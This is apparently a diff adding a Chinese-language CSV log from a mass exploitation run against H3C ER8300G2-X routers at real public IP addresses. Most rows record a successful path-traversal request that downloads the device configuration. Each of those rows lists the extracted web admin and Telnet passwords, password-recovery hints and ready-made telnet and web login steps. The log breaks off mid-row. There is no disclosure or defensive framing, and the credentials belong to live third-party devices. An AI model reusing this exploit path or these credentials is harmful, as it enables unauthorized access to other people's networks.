@@ -1,0 +1,2885 @@
+﻿目标,端口,脆弱,漏洞类型,指纹,Web密码,Telnet密码,设备型号,详情
+59.175.212.114,8888,是,配置泄露,H3C,whrt2021@h3c,ljjzx@2021,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://59.175.212.114:8888/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 156885 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D023
+  📋 提取的敏感信息:
+    🔑 Web管理密码: whrt2021@h3c (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: ljjzx@2021 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 陆家街2021 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.103.24.68
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 59.175.212.114 8888
+       密码: ljjzx@2021
+    2. Web登录: http://59.175.212.114:8888/userLogin.asp
+       密码: whrt2021@h3c
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+114.250.86.199,18080,是,配置泄露,H3C,Dhmhz2009@,Dhmhz2009@,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://114.250.86.199:18080/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 159050 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Dhmhz2009@ (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Dhmhz2009@ (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 114.114.114.114
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 114.250.86.199 18080
+       密码: Dhmhz2009@
+    2. Web登录: http://114.250.86.199:18080/userLogin.asp
+       密码: Dhmhz2009@
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+221.235.158.226,9004,是,配置泄露,H3C,Aa123456,Aa123456,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://221.235.158.226:9004/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 156598 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Aa123456 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Aa123456 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: A (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.103.44.150
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 221.235.158.226 9004
+       密码: Aa123456
+    2. Web登录: http://221.235.158.226:9004/userLogin.asp
+       密码: Aa123456
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+59.49.25.99,9999,是,配置泄露,H3C,lejin@123,lejin@123,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://59.49.25.99:9999/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 160587 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: lejin@123 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: lejin@123 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 223.5.5.5
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 59.49.25.99 9999
+       密码: lejin@123
+    2. Web登录: http://59.49.25.99:9999/userLogin.asp
+       密码: lejin@123
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+36.27.4.230,10001,是,配置泄露,H3C,0906@alt!,0906@alt!,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://36.27.4.230:10001/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 164009 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: 0906@alt! (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: 0906@alt! (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: dt (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 8.8.8.8
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 36.27.4.230 10001
+       密码: 0906@alt!
+    2. Web登录: http://36.27.4.230:10001/userLogin.asp
+       密码: 0906@alt!
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+112.80.242.166,8443,是,配置泄露,H3C,Password@12345,Transwarp@12345,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://112.80.242.166:8443/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 156651 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Password@12345 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Transwarp@12345 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: Transwarpadmin (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 114.114.114.114
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 112.80.242.166 8443
+       密码: Transwarp@12345
+    2. Web登录: http://112.80.242.166:8443/userLogin.asp
+       密码: Password@12345
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+140.207.14.22,9999,是,配置泄露,H3C,admin,admin,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://140.207.14.22:9999/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 152858 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D005
+  📋 提取的敏感信息:
+    🔑 Web管理密码: admin (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: admin (vtypasswd=  @base 段 #1/#2)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 143.92.49.186
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 140.207.14.22 9999
+       密码: admin
+    2. Web登录: http://140.207.14.22:9999/userLogin.asp
+       密码: admin
+    3. 弱口令检测: ⚠️ Web密码是弱口令!; Telnet密码是弱口令!"
+183.23.149.222,8089,是,配置泄露,H3C,Clt@123,Clt4008770775,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://183.23.149.222:8089/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 166076 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D025
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Clt@123 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Clt4008770775 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: Clt (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 223.5.5.5
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 183.23.149.222 8089
+       密码: Clt4008770775
+    2. Web登录: http://183.23.149.222:8089/userLogin.asp
+       密码: Clt@123
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+113.80.77.189,9999,是,配置泄露,H3C,Skroute@1986,Skroute@1986,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://113.80.77.189:9999/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 163030 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Skroute@1986 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Skroute@1986 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: who (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 223.5.5.5
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 113.80.77.189 9999
+       密码: Skroute@1986
+    2. Web登录: http://113.80.77.189:9999/userLogin.asp
+       密码: Skroute@1986
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+59.39.226.3,8081,是,配置泄露,H3C,Xk81515092,Xk81515092,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://59.39.226.3:8081/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 159848 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Xk81515092 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Xk81515092 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: XingKe (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 0.0.0.0
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 59.39.226.3 8081
+       密码: Xk81515092
+    2. Web登录: http://59.39.226.3:8081/userLogin.asp
+       密码: Xk81515092
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+101.64.133.27,12000,是,配置泄露,H3C,tojoy-nbfgs,tojoy-nbfgs,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://101.64.133.27:12000/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 155760 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D025
+  📋 提取的敏感信息:
+    🔑 Web管理密码: tojoy-nbfgs (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: tojoy-nbfgs (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 0.0.0.0
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 101.64.133.27 12000
+       密码: tojoy-nbfgs
+    2. Web登录: http://101.64.133.27:12000/userLogin.asp
+       密码: tojoy-nbfgs
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+61.167.82.235,55555,是,配置泄露,H3C,bq123456,bq123456,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://61.167.82.235:55555/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 159933 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: bq123456 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: bq123456 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: bq (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.97.224.68
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 61.167.82.235 55555
+       密码: bq123456
+    2. Web登录: http://61.167.82.235:55555/userLogin.asp
+       密码: bq123456
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+1.189.39.154,12000,是,配置泄露,H3C,tojoy-hebfgs,tojoy-hebfgs,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://1.189.39.154:12000/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 155667 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: tojoy-hebfgs (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: tojoy-hebfgs (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.97.224.68
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 1.189.39.154 12000
+       密码: tojoy-hebfgs
+    2. Web登录: http://1.189.39.154:12000/userLogin.asp
+       密码: tojoy-hebfgs
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+1.63.153.153,55555,是,配置泄露,H3C,bq123456,bq123456,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://1.63.153.153:55555/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 159933 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: bq123456 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: bq123456 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: bq (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.97.224.68
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 1.63.153.153 55555
+       密码: bq123456
+    2. Web登录: http://1.63.153.153:55555/userLogin.asp
+       密码: bq123456
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+183.129.213.138,10443,是,配置泄露,H3C,Jls@87250388Aaa1234Bbb,Jls@87250388Aaa1234Bbb,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://183.129.213.138:10443/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 165752 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Jls@87250388Aaa1234Bbb (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Jls@87250388Aaa1234Bbb (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: fwq (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.101.172.35
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 183.129.213.138 10443
+       密码: Jls@87250388Aaa1234Bbb
+    2. Web登录: http://183.129.213.138:10443/userLogin.asp
+       密码: Jls@87250388Aaa1234Bbb
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+125.81.235.147,8989,否,配置泄露,,,,,端口未开放，跳过检测
+14.220.239.38,4040,否,配置泄露,,,,,端口未开放，跳过检测
+49.72.176.122,10000,否,配置泄露,,,,,端口未开放，跳过检测
+124.200.0.2,8080,否,配置泄露,,,,,端口未开放，跳过检测
+180.158.81.221,777,否,配置泄露,,,,,端口未开放，跳过检测
+106.81.205.85,8989,否,配置泄露,,,,,端口未开放，跳过检测
+60.177.226.255,10001,否,配置泄露,,,,,端口未开放，跳过检测
+183.162.225.25,9999,是,配置泄露,H3C,Leyoah123@,Leyoah123@,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://183.162.225.25:9999/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 163551 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Leyoah123@ (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Leyoah123@ (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: ahly (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 223.5.5.5
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 183.162.225.25 9999
+       密码: Leyoah123@
+    2. Web登录: http://183.162.225.25:9999/userLogin.asp
+       密码: Leyoah123@
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+14.220.240.53,4040,是,配置泄露,H3C,yXj5736901,yXj5736901,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://14.220.240.53:4040/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 163241 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: yXj5736901 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: yXj5736901 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 身份证名简称红位大写家电话号 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 0.0.0.0
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 14.220.240.53 4040
+       密码: yXj5736901
+    2. Web登录: http://14.220.240.53:4040/userLogin.asp
+       密码: yXj5736901
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+43.136.106.99,8020,是,配置泄露,H3C,admin@123,Fd@20202021,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://43.136.106.99:8020/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 157388 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: admin@123 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Fd@20202021 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: Fd2年 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.96.128.166
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 43.136.106.99 8020
+       密码: Fd@20202021
+    2. Web登录: http://43.136.106.99:8020/userLogin.asp
+       密码: admin@123
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+14.153.251.214,1234,否,配置泄露,,,,,端口未开放，跳过检测
+183.62.164.198,8081,是,配置泄露,H3C,Htjc6688@,Htjc@123,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://183.62.164.198:8081/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 157609 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D025
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Htjc6688@ (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Htjc@123 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 123 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.96.134.133
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 183.62.164.198 8081
+       密码: Htjc@123
+    2. Web登录: http://183.62.164.198:8081/userLogin.asp
+       密码: Htjc6688@
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+120.196.58.250,999,是,配置泄露,H3C,Y2023@qq.com,Y2023@qq.com,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://120.196.58.250:999/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 155423 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D023
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Y2023@qq.com (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Y2023@qq.com (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 223.5.5.5
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 120.196.58.250 999
+       密码: Y2023@qq.com
+    2. Web登录: http://120.196.58.250:999/userLogin.asp
+       密码: Y2023@qq.com
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+183.62.164.247,8081,是,配置泄露,H3C,Htjc6688@,Htjc@123,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://183.62.164.247:8081/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 157609 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D025
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Htjc6688@ (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Htjc@123 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 123 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.96.134.133
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 183.62.164.247 8081
+       密码: Htjc@123
+    2. Web登录: http://183.62.164.247:8081/userLogin.asp
+       密码: Htjc6688@
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+27.185.105.98,10001,是,配置泄露,H3C,admin,admin,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://27.185.105.98:10001/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 162793 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: admin (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: admin (vtypasswd=  @base 段 #1/#2)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 114.114.114.114
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 27.185.105.98 10001
+       密码: admin
+    2. Web登录: http://27.185.105.98:10001/userLogin.asp
+       密码: admin
+    3. 弱口令检测: ⚠️ Web密码是弱口令!; Telnet密码是弱口令!"
+59.36.16.48,8000,是,配置泄露,H3C,edcokm,edcokm,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://59.36.16.48:8000/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 161837 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: edcokm (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: edcokm (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: edc (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 202.96.128.68
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 59.36.16.48 8000
+       密码: edcokm
+    2. Web登录: http://59.36.16.48:8000/userLogin.asp
+       密码: edcokm
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+116.236.100.190,8090,是,配置泄露,H3C,Abc123456,Abc123456,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://116.236.100.190:8090/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 156719 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Abc123456 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Abc123456 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: 监控密码 (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 114.114.114.114
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 116.236.100.190 8090
+       密码: Abc123456
+    2. Web登录: http://116.236.100.190:8090/userLogin.asp
+       密码: Abc123456
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+14.220.247.122,4040,否,配置泄露,,,,,端口未开放，跳过检测
+39.165.249.5,8069,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+59.175.205.242,8899,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+171.221.236.114,8123,是,配置泄露,H3C,Adminzse159!,Adminzse159!,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://171.221.236.114:8123/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 156207 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: Adminzse159! (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: Adminzse159! (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: Az-e-1-9！ (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 61.139.2.69
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 171.221.236.114 8123
+       密码: Adminzse159!
+    2. Web登录: http://171.221.236.114:8123/userLogin.asp
+       密码: Adminzse159!
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+58.57.92.222,8069,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+175.6.7.237,8080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+116.247.103.61,10443,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+175.6.7.65,8080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+115.193.14.98,8081,否,配置泄露,,,,,端口未开放，跳过检测
+117.157.90.8,10002,是,配置泄露,H3C,kunyi_123,kunyi_123,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://117.157.90.8:10002/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 175812 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D026
+  📋 提取的敏感信息:
+    🔑 Web管理密码: kunyi_123 (admpwd=  @webadmin 段)
+    🔑 Telnet/VTY密码: kunyi_123 (vtypasswd=  @base 段 #1/#2)
+    💡 密码找回提示: @portmirror (admpwdpromt= 密码找回验证信息)
+    📡 Telnet服务: enable
+    🌐 DNS主服务器: 218.203.160.194
+  ⚡ 漏洞利用:
+    1. Telnet登录: telnet 117.157.90.8 10002
+       密码: kunyi_123
+    2. Web登录: http://117.157.90.8:10002/userLogin.asp
+       密码: kunyi_123
+    3. 弱口令检测: ✓ 密码强度较高，未命中已知弱口令库"
+60.221.226.147,18080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+122.224.208.58,2020,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+222.135.93.155,8089,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+27.223.81.146,18080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+222.128.73.22,18080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+183.2.219.37,8989,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+222.128.56.77,18080,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+111.10.205.109,10001,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.116.18.38,10443,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.116.17.108,10443,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+59.38.255.114,8090,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.89.102.238,20000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+120.196.249.98,8443,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+202.168.187.130,8899,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+113.105.103.90,20000,否,配置泄露,H3C,,,,未检测到配置泄露漏洞
+221.195.67.174,8088,是,配置泄露,H3C,raoanzhongxue,raoanzhongxue,ER8300G2-X,"▶ 漏洞利用成功！
+  利用路径: GET /userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  完整URL: http://221.195.67.174:8088/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
+  返回状态: HTTP 200
+  配置文件大小: 155726 bytes
+  设备型号: ER8300G2-X / ERHMG2V100D024
+  📋 提取的敏感信息:
+    🔑 Web管理密码: raoanzhongxue (admpwd=  @webadmin 段)
